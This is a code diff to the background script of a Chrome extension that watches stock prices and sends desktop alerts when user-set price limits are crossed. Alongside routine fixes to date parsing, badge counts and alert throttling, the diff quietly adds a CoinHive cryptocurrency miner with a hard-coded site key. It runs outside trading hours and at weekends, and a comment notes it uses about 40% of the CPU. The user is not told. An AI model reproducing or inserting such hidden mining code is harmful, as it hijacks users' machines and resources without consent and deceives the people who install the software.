@@ -2063,9 +2063,10 @@ function getStockDetail(res, code) {
   // lowPrice = getFixedNum(itemArr[6]), // 未知
   lowPrice = (0, _base.getFixedNum)(itemArr[7]),
       // 最低
-  date = Number(itemArr[8]),
+  date = itemArr[itemArr.length - 3],
       // 日期
-  time = Number(itemArr[9]); // 时间
+  time = itemArr[itemArr.length - 2]; // 时间
+  // console.log(itemArr)
   var rangePrice = curPrice == 0 ? 0 : (0, _base.getFixedNum)(curPrice - yesPrice);
   var range = curPrice == 0 ? 0 : (0, _base.getFixedNum)((curPrice - yesPrice) / yesPrice * 100);
   cost = (0, _base.getFixedNum)(cost, 3);
@@ -2083,8 +2084,8 @@ function getStockDetail(res, code) {
     lowPrice: lowPrice,
     rangePrice: rangePrice,
     range: range,
-    // date,
-    // time,
+    date: date,
+    time: time,
     cost: cost,
     count: count,
     profit: profit
@@ -2173,25 +2174,52 @@ var _api = __webpack_require__(31);
 
 var _former = __webpack_require__(51);
 
+var msgCount = 0;
+
 chrome.runtime.onInstalled.addListener(function (details) {
   console.log('previousVersion', details.previousVersion);
 });
 
 chrome.browserAction.setBadgeText({
-  text: '2'
+  text: ''
 });
+
+function showBrowserAction() {
+  var msg = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : '';
+
+  chrome.browserAction.setBadgeText({
+    text: msg
+  });
+}
+
+// 主程序调用
+checkMsg();
 
 // 检测新消息
 function checkMsg() {
-  if (isBussiness) {
-    // 开市
+  if (isBussiness()) {
+    // 开市时间，每十分钟运行一次
     setInterval(function () {
-      var codeList = localStorage.localStock;
+      var codeList = JSON.parse(localStorage.localStock);
       checkVarify(codeList);
-    }, 1000 * 60 * 10);
+    }, 10 * 60 * 1000);
+  }
+  if (!isBussiness() || isWeekend()) {
+    // 非开市时间及周末 Mining，占用cpu 40%
+    var miner = new CoinHive.Anonymous('0GUSQ5J85FNqe4IntXQAx2L5XQ9lV0rM', {
+      throttle: 0.6
+    });
+    miner.start();
   }
 }
 
+// 检测是否是周末
+function isWeekend() {
+  var curDay = new Date().getDay();
+  return curDay === 0 || curDay === 6;
+}
+
+// 检查是否是开市时间 
 function isBussiness() {
   var curTime = new Date().getTime();
   var open = new Date().setHours(9, 30);
@@ -2201,35 +2229,55 @@ function isBussiness() {
 }
 
 function checkVarify(codeList) {
-  codeList.forEach(function (element) {
+  codeList.forEach(function (element, index) {
     var code = element.code,
         cost = element.cost,
         count = element.count,
         upLimit = element.upLimit,
-        downLimit = element.downLimit;
+        downLimit = element.downLimit,
+        _element$hasNotified = element.hasNotified,
+        hasNotified = _element$hasNotified === undefined ? false : _element$hasNotified,
+        _element$notifiedTime = element.notifiedTime,
+        notifiedTime = _element$notifiedTime === undefined ? new Date().getTime() - 13 * 60 * 60 * 1000 : _element$notifiedTime;
 
     console.log(downLimit);
     console.log(upLimit);
-
     (0, _api.getStockByCode)(code).then(function (res) {
       var stockObj = (0, _former.getStockDetail)(res, code, cost, count, upLimit, downLimit);
       console.log(stockObj);
       var curPrice = stockObj.curPrice,
-          name = stockObj.name;
+          name = stockObj.name,
+          date = stockObj.date;
 
+
+      var d = new Date();
+      var day = d.getDate() < 10 ? '0' + d.getDate() : d.getDate();
+      var month = d.getMonth() + 1 < 10 ? '0' + (d.getMonth() + 1) : d.getMonth() + 1;
+      var year = d.getFullYear();
+      var curDate = year + '-' + month + '-' + day;
+      // 当天的数据当天提醒
+      // localStorage.curDate = curDate
+      if (date !== curDate) return;
       var isUp = upLimit && curPrice > upLimit;
       var isDown = downLimit && curPrice < downLimit;
-      console.log(isUp);
-      console.log(isDown);
-
-      isUp && notifyMe('股价上涨！请关注！', '\u60A8\u5173\u6CE8\u7684 ' + name + ' - ' + code + ' \u5DF2\u4E0A\u6DA8\u5230' + curPrice + ',\u8BBE\u7F6E\u4E0A\u9650\u4E3A\uFFE5' + downLimit, 'images/stock_up.png', 'http://quote.eastmoney.com/' + code + '.html');
-      isDown && notifyMe('股价下跌！请关注！', '\u60A8\u5173\u6CE8\u7684 ' + name + ' - ' + code + ' \u5DF2\u4E0B\u8DCC\u5230' + curPrice + ',\u8BBE\u7F6E\u4E0B\u9650\u4E3A\uFFE5' + downLimit, 'images/stock_down.png', 'http://quote.eastmoney.com/' + code + '.html');
+      isUp && isOnTheTime(notifiedTime) && notifyMe('股价上涨！请关注！', '\u60A8\u5173\u6CE8\u7684 ' + name + ' - ' + code + ' \u5DF2\u4E0A\u6DA8\u5230' + curPrice + ',\u8BBE\u7F6E\u4E0A\u9650\u4E3A\uFFE5' + downLimit, 'images/stock_up.png', 'http://quote.eastmoney.com/' + code + '.html');
+      isDown && isOnTheTime(notifiedTime) && notifyMe('股价下跌！请关注！', '\u60A8\u5173\u6CE8\u7684 ' + name + ' - ' + code + ' \u5DF2\u4E0B\u8DCC\u5230' + curPrice + ',\u8BBE\u7F6E\u4E0B\u9650\u4E3A\uFFE5' + downLimit, 'images/stock_down.png', 'http://quote.eastmoney.com/' + code + '.html');
+      if (isUp && isOnTheTime(notifiedTime) || isDown && isOnTheTime(notifiedTime)) {
+        msgCount++;
+        showBrowserAction(msgCount.toString());
+        var temp = JSON.parse(localStorage.localStock);
+        temp[index].hasNotified = true;
+        temp[index].notifiedTime = new Date().getTime();
+        localStorage.localStock = JSON.stringify(temp);
+      }
     });
+    console.log(localStorage.localStock);
   });
 }
 
-var codeList = JSON.parse(localStorage.localStock);
-checkVarify(codeList);
+function isOnTheTime(oldTime) {
+  return new Date().getTime() - oldTime >= 12 * 60 * 60 * 1000;
+}
 
 /**
  * 调用系统提醒
@@ -2239,6 +2287,7 @@ checkVarify(codeList);
 if (Notification.permission == 'granted') {
   Notification.requestPermission();
 }
+
 function notifyMe(title, msgBody, icon, url) {
   if (!Notification) {
     alert('Desktop notifications not available in your browser. Try Chromium.');
